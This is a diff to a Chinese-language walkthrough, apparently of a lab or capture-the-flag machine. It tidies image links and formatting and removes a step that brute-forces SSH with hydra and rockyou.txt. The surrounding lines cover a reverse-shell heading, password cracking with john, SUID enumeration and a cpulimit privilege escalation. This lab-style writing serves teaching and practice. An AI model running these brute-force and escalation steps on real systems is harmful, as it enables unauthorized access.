@@ -69,7 +69,7 @@ strings sprites.png
 没发现什么信息。🌚
 
 **访问一下`http://192.168.64.14/backup`**
-![]()
+![](./img/19.png)
 这个文件夹应该是网站存放备份文件的地方，里面有一个 *mysql.bak* 的文件，下载下来看看。*mysql.bak*文件的内容如下：
 ```shell
 #!/bin/bash
@@ -183,17 +183,6 @@ sshd:x:117:65534::/run/sshd:/usr/sbin/nologin
 mysql:x:118:126:MySQL Server,,,:/nonexistent:/bin/false
 ```
 
-提取里面的所有用户名：
-```shell
-awk -F ':' '{print $1}' > users.txt
-```
-
-尝试使用rockyou.txt爆破这些用户名ssh密码:
-```shell
-hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://192.168.64.14
-```
-
-
 **建立反弹连接**
 使用msfvenom生成php反弹连接：
 ```shell
@@ -236,7 +225,7 @@ john --wordlist=/usr/share/wordlists/rockyou.txt myshadow.txt
 ```shell
 find / -perm -4000 -type f 2>/dev/null
 ```
-发现在自己的家目录下有一个cpulimit的文件。
+发现在自己的家目录下有一个`cpulimit`的文件。
 去GTFOBins里面搜索：
 ![](./img/15.png)
 
